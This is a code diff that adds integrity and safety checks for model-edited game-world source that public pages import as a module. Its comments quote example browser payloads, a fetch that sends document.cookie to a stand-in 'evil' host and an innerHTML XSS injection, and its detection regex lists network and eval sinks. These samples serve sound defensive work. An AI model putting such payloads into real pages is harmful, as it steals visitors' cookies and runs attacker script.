@@ -785,3 +785,257 @@ export function runValidatedWorldEdit(currentSource: string, edit: WorldEdit): {
 export function worldEditPathAvailable(source: string): boolean {
   return DATA_BLOCKS.every((name) => source.includes(`/*@DATA:${name}:BEGIN*/`) && source.includes(`/*@DATA:${name}:END*/`));
 }
+
+// =============================================================================
+// WORLD INTEGRITY — checks that look at the WORLD, not at the sim functions
+//
+// The nine regression cases all call tick/chooseAction/applyAction. Those are
+// pure functions over needs and money: they do not read objectTypes, buildings,
+// placements or surfaces, and they pass identically whether or not a data edit
+// did anything at all. Combined with decideStillFailing deliberately allowing a
+// plan to propose zero criteria, that left a real hole -- a data-edit run could
+// report "shipped, verified" when nothing in the verification had looked at the
+// data it changed. For a system whose entire claim is that it only says yes when
+// yes is true, that is the wrong hole to have.
+//
+// These checks are deterministic, need no sandbox and cost nothing. They are
+// appended to the REGRESSION results, not the criteria, because decideStillFailing
+// treats an empty regression array as "verification did not happen" and any
+// failing regression entry as failing -- which is exactly the weight they should
+// carry. They are derived by DIFFING the world data before and after, so they
+// check what actually changed rather than what the model said it would change.
+// =============================================================================
+
+export interface IntegrityResult {
+  name: string;
+  pass: boolean;
+  expected?: unknown;
+  actual?: unknown;
+  error?: string;
+}
+
+/**
+ * @param before  the source the run started from
+ * @param after   the candidate source
+ * @param dataEditExpected  true when the plan chose the data-edit path, where a
+ *   world whose data is byte-identical means the edit did nothing
+ */
+
+/**
+ * Strip comments and string/template literals so a crude structural scan can
+ * look at code shape without tripping over text that merely LOOKS like code.
+ */
+function stripLiterals(src: string): string {
+  let out = "";
+  let i = 0;
+  const n = src.length;
+  while (i < n) {
+    const c = src[i], d = src[i + 1];
+    if (c === "/" && d === "/") { while (i < n && src[i] !== "\n") i++; continue; }
+    if (c === "/" && d === "*") { i += 2; while (i < n && !(src[i] === "*" && src[i + 1] === "/")) i++; i += 2; continue; }
+    if (c === '"' || c === "'" || c === "`") {
+      const q = c; i++;
+      while (i < n && src[i] !== q) { if (src[i] === "\\") i++; i++; }
+      i++; out += '""';
+      continue;
+    }
+    out += c; i++;
+  }
+  return out;
+}
+
+/**
+ * Does this source contain any TOP-LEVEL executable statement?
+ *
+ * This matters because the shipped world source is served at /world-source and
+ * dynamically import()ed as a module by four public pages. For a source edit,
+ * that text is a whole file a model wrote. The sandbox cannot catch a payload
+ * aimed at the browser -- there is no DOM in a Dynamic Worker, so
+ * `if (typeof document !== "undefined") { ... }` runs nowhere during
+ * verification and everywhere afterwards.
+ *
+ * The world is meant to be declarations and nothing else: four functions, the
+ * data blocks, and one export statement. Anything that EXECUTES at module load
+ * is therefore both unnecessary and the exact shape an injected payload takes,
+ * so it is refused rather than reasoned about.
+ */
+export function topLevelSideEffects(source: string): string[] {
+  const code = stripLiterals(source);
+  const offenders: string[] = [];
+  let depth = 0;
+
+  for (const rawLine of code.split("\n")) {
+    const line = rawLine.trim();
+    const atTop = depth === 0;
+
+    if (atTop && line && !line.startsWith("//") && !line.startsWith("/*") && !line.startsWith("*")
+        && line !== "}" && !line.startsWith("}") && !line.startsWith(")") && !line.startsWith("]")) {
+      // A declaration keyword was previously enough to pass. It is not: the
+      // dangerous part of a top-level statement is its INITIALISER, and
+      //     const _x = fetch("https://evil/?c=" + document.cookie);
+      // is a const declaration. Verified: every one of import/const/let/var/
+      // class defeated the old check, which then reported "the world runs
+      // nothing at module load: pass". This source is import()ed as a module by
+      // four public pages and the sandbox has no DOM, so nothing else can catch
+      // a browser-aimed payload.
+      //
+      // So the rule is about what EXECUTES, not what it is spelled with.
+      const decl = /^(?:export\s+)?(?:async\s+)?(?:function|class)\s/.test(line);
+      const binding = /^(?:export\s+)?(?:const|let|var)\s/.test(line);
+      const exportOnly = /^export\s*[{*]/.test(line);
+
+      if (!decl && !binding && !exportOnly) {
+        offenders.push(line.slice(0, 90));                    // a bare statement
+      } else if (binding) {
+        // a binding is fine only if its initialiser cannot run anything
+        const rhs = line.slice(line.indexOf("=") + 1);
+        if (line.includes("=")) {
+          // Calls are not the only way an initialiser can do work:
+          //     var _y = (document.body.innerHTML = "<img src=x onerror=...>");
+          // is an ASSIGNMENT, contains no call, and defeated a call-only test.
+          // So an initialiser must neither invoke anything nor assign anything.
+          const calls = /[\w$)\]]\s*\(/.test(rhs);
+          const assigns = /(^|[^=!<>])=(?!=|>)/.test(rhs);      // '=' that is not ==, ===, !=, <=, >=, =>
+          const reaches = /\b(document|window|globalThis|self|fetch|eval|Function|XMLHttpRequest|WebSocket|localStorage)\b/.test(rhs);
+          if (calls || assigns || reaches) offenders.push(line.slice(0, 90));
+        }
+      }
+      // `import` is deliberately absent from every allowed shape: the world is
+      // self-contained, and a top-level import is a remote code fetch.
+      if (/^import\b/.test(line)) offenders.push(line.slice(0, 90));
+      // class static initialiser blocks run at definition time
+      if (decl && /\bstatic\s*\{/.test(line)) offenders.push(line.slice(0, 90));
+    }
+
+    for (const ch of rawLine) {
+      if (ch === "{" || ch === "(" || ch === "[") depth++;
+      else if (ch === "}" || ch === ")" || ch === "]") depth--;
+    }
+    if (depth < 0) depth = 0;
+  }
+  return offenders;
+}
+
+export function worldIntegrityChecks(before: string, after: string, dataEditExpected: boolean): IntegrityResult[] {
+  const out: IntegrityResult[] = [];
+
+  let a: LiveWorld;
+  try {
+    a = readWorldData(after);
+  } catch (e) {
+    // A source edit is never validated against the data blocks the way a data
+    // edit is, so a rewrite that mangles them reaches here and must fail loudly.
+    return [{
+      name: "the changed world still parses as a world",
+      pass: false,
+      error: String((e as Error)?.message ?? e),
+      expected: "the four data blocks parse",
+    }];
+  }
+  let b: LiveWorld | null = null;
+  try { b = readWorldData(before); } catch { b = null; }
+
+  out.push({ name: "the changed world still parses as a world", pass: true, expected: "the four data blocks parse", actual: "parsed" });
+
+  // 0. nothing executes at module load
+  //
+  // The strongest check available for the fact that this text becomes a
+  // <script type=module> in a visitor's browser. A world is declarations; a
+  // payload is a statement.
+  const sideEffects = topLevelSideEffects(after);
+  out.push({
+    name: "the world runs nothing at module load",
+    pass: sideEffects.length === 0,
+    expected: "only declarations at the top level",
+    actual: sideEffects.length === 0 ? "declarations only" : `${sideEffects.length} top-level statement(s): ${sideEffects.slice(0, 3).join(" | ")}`,
+  });
+
+  // 1. the change is observable at all
+  if (dataEditExpected) {
+    const changed = b !== null && JSON.stringify(dataOf(a)) !== JSON.stringify(dataOf(b));
+    out.push({
+      name: "the data edit actually changed the world data",
+      pass: changed,
+      expected: "objectTypes/buildings/placements/surfaces differ from the source this run started from",
+      actual: changed ? "changed" : "byte-identical -- the edit applied cleanly and did nothing",
+    });
+  } else {
+    const changed = after !== before;
+    out.push({
+      name: "the change actually changed the source",
+      pass: changed,
+      expected: "the candidate source differs from the source this run started from",
+      actual: changed ? "changed" : "identical",
+    });
+  }
+
+  // 2. nothing was silently deleted. None of the four edit ops can delete
+  //    anything, so any disappearance is a regression -- and on the source-edit
+  //    path, where a model rewrites the file, it is the likeliest one.
+  if (b) {
+    const lost: string[] = [];
+    for (const k of Object.keys(b.objectTypes)) if (!(k in a.objectTypes)) lost.push(`objectType "${k}"`);
+    for (const k of Object.keys(b.surfaces)) if (!(k in a.surfaces)) lost.push(`surface "${k}"`);
+    const aIds = new Set(a.placements.map((p) => p.id));
+    for (const p of b.placements) if (!aIds.has(p.id)) lost.push(`placement "${p.id}"`);
+    const aB = new Set(a.buildings.map((x) => x.id));
+    for (const x of b.buildings) if (!aB.has(x.id)) lost.push(`building "${x.id}"`);
+    out.push({
+      name: "nothing that existed before was deleted",
+      pass: lost.length === 0,
+      expected: "no object type, surface, placement or building disappears",
+      actual: lost.length ? lost.slice(0, 8).join(", ") + (lost.length > 8 ? ` (+${lost.length - 8} more)` : "") : "nothing lost",
+    });
+  }
+
+  // 3. referential integrity: every placement points at a type that exists and
+  //    a home that exists. A registry entry the renderer cannot resolve draws
+  //    nothing, silently -- the visitor is told yes and sees no change.
+  const badType = a.placements.filter((p) => !(p.type in a.objectTypes)).map((p) => `${p.id}:${p.type}`);
+  out.push({
+    name: "every placement references an object type that exists",
+    pass: badType.length === 0,
+    expected: "placement.type is a key of objectTypes",
+    actual: badType.length ? badType.slice(0, 8).join(", ") : "all resolve",
+  });
+
+  const buildingIds = new Set(a.buildings.map((x) => x.id));
+  const badHome = a.placements
+    .filter((p) => p.location !== "outdoors" && !buildingIds.has(p.location))
+    .map((p) => `${p.id}@${p.location}`);
+  out.push({
+    name: "every placement stands somewhere that exists",
+    pass: badHome.length === 0,
+    expected: 'placement.location is "outdoors" or a real building id',
+    actual: badHome.length ? badHome.slice(0, 8).join(", ") : "all resolve",
+  });
+
+  // 4. outdoor placements carry the coordinates the renderer needs
+  const badPlot = a.placements
+    .filter((p) => p.location === "outdoors")
+    .filter((p) => !p.plot || typeof p.plot.x !== "number" || typeof p.plot.y !== "number")
+    .map((p) => p.id);
+  out.push({
+    name: "every outdoor placement has real coordinates",
+    pass: badPlot.length === 0,
+    expected: "location 'outdoors' implies numeric plot {x, y}",
+    actual: badPlot.length ? badPlot.slice(0, 8).join(", ") : "all have coordinates",
+  });
+
+  // 5. ids are unique. A duplicate id makes one of the two unaddressable by any
+  //    later override op, so a subsequent edit would silently hit the wrong one.
+  const seen = new Set<string>(), dupes: string[] = [];
+  for (const p of a.placements) { if (seen.has(p.id)) dupes.push(p.id); seen.add(p.id); }
+  out.push({
+    name: "placement ids are unique",
+    pass: dupes.length === 0,
+    expected: "no two placements share an id",
+    actual: dupes.length ? [...new Set(dupes)].join(", ") : "unique",
+  });
+
+  return out;
+}
+
+function dataOf(w: LiveWorld) {
+  return { objectTypes: w.objectTypes, buildings: w.buildings, placements: w.placements, surfaces: w.surfaces };
+}
